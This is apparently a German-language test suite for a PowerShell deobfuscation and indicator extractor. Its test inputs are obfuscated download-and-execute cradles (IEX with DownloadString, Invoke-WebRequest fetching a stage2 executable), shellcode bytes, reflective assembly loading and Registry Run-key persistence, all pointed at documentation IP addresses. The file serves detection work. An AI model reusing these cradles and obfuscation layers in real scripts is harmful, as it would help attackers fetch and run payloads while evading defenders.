#!/usr/bin/env python3
"""
Tests fuer den Extraktor. Jeder Fall ist ein selbst gebautes Skript, bei dem
die richtige Loesung feststeht. Alle Adressen stammen aus Dokumentationsnetzen.

Aufruf:  python3 tests/test_extraktor.py     (oder: pytest tests/)
"""
import base64
import gzip
import sys
import zlib
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
import steckbrief as S  # noqa: E402


def sb(code, label="malicious", name="geheim_dateiname.ps1"):
    data = code if isinstance(code, bytes) else code.encode("utf-8")
    return S.build_steckbrief(name, data, label)


def sicht(b, key, wert):
    for x in b["befunde"][key]:
        if x["wert"] == wert:
            return x["sichtbar_in"]
    return None


def token(b, name):
    for t in b["befunde"]["tokens"]:
        if t["name"] == name:
            return t["sichtbar_in"]
    return None


def b64(data):
    return base64.b64encode(data).decode()


def test_encodedcommand_utf16():
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.5/a.ps1')"
    b = sb("powershell -nop -w hidden -enc " + b64(inner.encode("utf-16-le")))
    assert b["schichten"][0]["kette"] == ["base64", "utf-16le"]
    assert b["schichten"][0]["inhalt"] == inner
    assert sicht(b, "urls", "http://192.0.2.5/a.ps1") == "S1"
    assert token(b, "downloadstring") == "S1"
    assert token(b, "encodedcommand") == "original"


def test_kurzes_encodedcommand():
    b = sb("powershell -e " + b64("calc.exe -x".encode("utf-16-le")))
    assert b["schichten"][0]["inhalt"] == "calc.exe -x"


def test_gzip_base64():
    inner = "Invoke-WebRequest -Uri http://198.51.100.7/stage2 -OutFile $env:TEMP\\s.exe"
    blob = b64(gzip.compress(inner.encode()))
    b = sb("$s=New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'))" % blob)
    assert b["schichten"][0]["kette"] == ["base64", "gzip", "utf-8"]
    assert b["schichten"][0]["inhalt"] == inner
    assert sicht(b, "urls", "http://198.51.100.7/stage2") == "S1"
    assert sicht(b, "pfade", "$env:TEMP\\s.exe") == "S1"


def test_deflate_und_zlib():
    inner = "Start-Process notepad.exe; Write-Host 'deflate test payload number one'"
    raw = zlib.compressobj(9, zlib.DEFLATED, -15)
    d = raw.compress(inner.encode()) + raw.flush()
    b = sb("$a='%s'" % b64(d))
    assert b["schichten"][0]["kette"] == ["base64", "deflate", "utf-8"]
    assert b["schichten"][0]["inhalt"] == inner
    b = sb("$a='%s'" % b64(zlib.compress(inner.encode())))
    assert b["schichten"][0]["kette"] == ["base64", "zlib", "utf-8"]


def test_verschachtelt():
    innerst = "IEX (irm https://203.0.113.9/final)"
    mitte = "powershell -EncodedCommand " + b64(innerst.encode("utf-16-le"))
    b = sb("$x=[Convert]::FromBase64String('%s')" % b64(gzip.compress(mitte.encode())))
    assert [s["id"] for s in b["schichten"]] == ["S1", "S2"]
    assert b["schichten"][1]["herkunft"] == "S1"
    assert b["schichten"][1]["inhalt"] == innerst
    assert sicht(b, "urls", "https://203.0.113.9/final") == "S2"
    assert b["ueberblick"]["schichten"] == 2


def test_zeichencodes():
    url = "http://192.0.2.77/x"
    code = "$u=" + "+".join("[char]%d" % ord(c) for c in url) + "; iwr $u"
    b = sb(code)
    assert sicht(b, "urls", url) == "deobfuskiert"
    assert b["deobfuskation"]["schritte"]["char_codes"] == len(url)
    b = sb("$u=[char[]](%s) -join ''" % ",".join(str(ord(c)) for c in url))
    assert sicht(b, "urls", url) == "deobfuskiert"
    b = sb("$u=[char]0x68+[char]0x74+'tp://192.0.2.77/x'")
    assert sicht(b, "urls", url) == "deobfuskiert"


def test_format_operator():
    b = sb("""$u = ("{2}{0}{1}" -f 'tp://198.51.100.9/','pay','ht'); iwr $u""")
    assert sicht(b, "urls", "http://198.51.100.9/pay") == "deobfuskiert"
    assert b["deobfuskation"]["schritte"]["format_operator"] == 1
    # -f bindet staerker als +
    b = sb("$x = '{0}{1}' -f 'Down','loadSt' + 'ring'")
    assert token(b, "downloadstring") == "deobfuskiert"


def test_konkatenation_und_backticks():
    b = sb("$u = 'htt'+'p://192'+'.0.2.10/p'\nI`E`X $u\n(New-Object Net.WebClient).\"Down`loadString\"($u)")
    assert sicht(b, "urls", "http://192.0.2.10/p") == "deobfuskiert"
    assert token(b, "invoke_expression") == "deobfuskiert"
    assert b["deobfuskation"]["schritte"]["backticks"] == 2
    assert b["deobfuskation"]["schritte"]["konkatenation"] == 2


def test_replace():
    b = sb("$u='hXXp://192.0.2.3/a'.Replace('XX','tt')")
    assert sicht(b, "urls", "http://192.0.2.3/a") == "deobfuskiert"
    b = sb("$u='hQQp://192.0.2.3/b' -replace 'qq','tt'")
    assert sicht(b, "urls", "http://192.0.2.3/b") == "deobfuskiert"
    b = sb("$u='hQQp://192.0.2.3/c' -creplace 'qq','tt'")      # -creplace beachtet Gross/Klein
    assert sicht(b, "urls", "http://192.0.2.3/c") is None
    b = sb("$u='a.b' -replace '.','x'")                        # Regex-Muster wird nicht angefasst
    assert b["deobfuskation"]["schritte"]["replace"] == 0


def test_join():
    b = sb("$u = ('ht','tp://','192.0.2.4/j') -join ''")
    assert sicht(b, "urls", "http://192.0.2.4/j") == "deobfuskiert"
    b = sb("$u = -join('ht','tp://','192.0.2.4/k')")
    assert sicht(b, "urls", "http://192.0.2.4/k") == "deobfuskiert"


def test_umgedreht():
    url = "http://192.0.2.8/rev"
    b = sb("$u = '%s'[-1..-%d] -join ''" % (url[::-1], len(url)))
    assert sicht(b, "urls", url) == "deobfuskiert"
    b = sb("$r = '%s'; $a=$r.ToCharArray(); [array]::Reverse($a)" % url[::-1])
    assert b["schichten"][0]["kette"] == ["umgedreht"]
    assert sicht(b, "urls", url) == "S1"


def test_xor_mit_sichtbarem_schluessel():
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.44/xor')"
    enc = ",".join(str(b ^ 0x4B) for b in inner.encode())
    b = sb("$d = (%s) | %% { [char]($_ -bxor 0x4B) }; iex (-join $d)" % enc)
    assert b["schichten"][0]["kette"] == ["byte-liste", "xor 0x4b", "utf-8"]
    assert b["schichten"][0]["inhalt"] == inner
    assert b["deobfuskation"]["schritte"]["xor"] == 1
    # ohne sichtbaren Schluessel wird NICHT geraten
    b = sb("$d = (%s)" % enc)
    assert all(s["art"] == "binaer" for s in b["schichten"])


def test_binaerer_blob():
    pe = b"MZ\x90\x00" + bytes(range(256)) + b"This program cannot be run in DOS mode" + bytes(60)
    b = sb("[Reflection.Assembly]::Load([Convert]::FromBase64String('%s'))" % b64(pe))
    s = b["schichten"][0]
    assert s["art"] == "binaer" and s["kennung"].startswith("PE-Datei")
    assert "This program cannot be run in DOS mode" in s["strings_im_blob"]
    assert s["laenge"] == len(pe)
    sc = bytes([0xFC, 0x48, 0x83, 0xE4]) + bytes(range(100, 180))
    b = sb("[Byte[]] $buf = " + ",".join("0x%02x" % x for x in sc))
    assert "Shellcode" in b["schichten"][0]["kennung"]


def test_kommentar_wird_getrennt():
    b = sb("<#\n.LINK\n  https://example.org/doku\n#>\n# siehe http://example.org/zwei\nGet-Date\n")
    assert sicht(b, "urls", "https://example.org/doku") == "kommentar"
    assert sicht(b, "urls", "http://example.org/zwei") == "kommentar"
    b = sb("$u = 'http://example.org/#anker'   # kein Kommentar im String\n")
    assert sicht(b, "urls", "http://example.org/#anker") == "original"


def test_behobene_fehlerkennungen():
    b = sb("# Beispiel-Skript mit Test-Kommentar\nSet-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name U -Value 'C:\\Users\\Public\\u.ps1'\n")
    pfade = [x["wert"] for x in b["befunde"]["pfade"]]
    assert pfade == ["C:\\Users\\Public\\u.ps1"]
    assert [x["wert"] for x in b["befunde"]["registry"]] == ["HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"]
    cm = {x["wert"]: x["sichtbar_in"] for x in b["befunde"]["cmdlets"]}
    assert cm == {"Set-ItemProperty": "original", "Test-Kommentar": "kommentar"}   # "Beispiel-Skript" ist kein Cmdlet
    assert token(b, "registry_run") == "original"


def test_parameter_bleiben_sichtbar():
    b = sb("New-NetFirewallRule -DisplayName 'Web' -Direction Inbound -Action Allow -LocalPort 443\n", "benign")
    assert any("-Action Allow" in z["zeile"] for z in b["auffaellige_zeilen"])


def test_gross_klein_egal():
    b = sb("iEx (nEw-oBjEcT nEt.wEbClIeNt).dOwNlOaDsTrInG('http://192.0.2.1/')")
    for t in ("invoke_expression", "webclient", "downloadstring"):
        assert token(b, t) == "original"


def test_llm_text_ohne_label_name_hash():
    code = "powershell -enc " + b64("IEX 'x'".encode("utf-16-le"))
    b = sb(code, "malicious", "geheim_dateiname.ps1")
    t = S.llm_text(b)
    assert "malicious" not in t and "geheim_dateiname" not in t and b["meta"]["sha256"] not in t
    for wort in ("bösartig", "gutartig", "Schweregrad", "Empfehlung"):
        assert wort not in t
    assert "malicious" in S.to_markdown(b)


def test_harmloses_skript():
    b = sb("param([string]$Name)\nWrite-Host \"Hallo $Name\"\nGet-ChildItem C:\\Temp | Sort-Object Length\n", "benign")
    assert b["schichten"] == [] and b["befunde"]["tokens"] == []
    assert not any(b["deobfuskation"]["schritte"].values())
    assert b["deobfuskation"]["auszug"] == ""


def test_robust():
    for code in ["", "'", '"', "@'", "`", "<#", "#", "\x01\x02\x03", "'a'+", "[char]", "[char]99999999",
                 "'{0}' -f", "'{5}' -f 'a'", "A" * 5000, "=" * 100, "-enc ====", "(" * 500 + "'a'" + ")" * 500,
                 b"\xff\xfe" + "Write-Host 'utf16'".encode("utf-16-le"), b"\xff\xfe\x00", bytes(range(256)) * 4,
                 "'x'" + "+'y'" * 3000]:
        b = sb(code)
        S.to_markdown(b), S.to_json(b), S.llm_text(b)
    b = sb(b"\xff\xfe" + "IEX 'http://192.0.2.200/u16'".encode("utf-16-le"))
    assert sicht(b, "urls", "http://192.0.2.200/u16") == "original"


def test_deterministisch():
    code = "$u=('{1}{0}' -f 'tp://192.0.2.9/','ht'); powershell -enc " + b64("IEX 1".encode("utf-16-le"))
    assert S.to_json(sb(code)) == S.to_json(sb(code))


def main():
    tests = [(n, f) for n, f in sorted(globals().items()) if n.startswith("test_") and callable(f)]
    fehler = 0
    for n, f in tests:
        try:
            f()
            print("ok    ", n)
        except Exception as e:                      # noqa: BLE001
            fehler += 1
            print("FEHLER", n, "->", repr(e))
            import traceback
            traceback.print_exc()
    print("%d Tests, %d Fehler" % (len(tests), fehler))
    sys.exit(1 if fehler else 0)


if __name__ == "__main__":
    main()
